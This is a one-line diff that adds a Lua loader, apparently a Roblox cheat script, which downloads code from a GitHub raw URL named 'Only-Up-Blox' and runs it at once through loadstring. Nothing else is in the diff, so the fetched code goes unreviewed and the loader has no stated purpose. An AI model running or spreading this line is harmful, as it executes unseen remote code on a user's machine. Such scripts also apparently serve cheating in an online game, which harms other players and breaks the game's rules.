@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/WinterDinder/Only-Up-Blox/main/Main", true))()
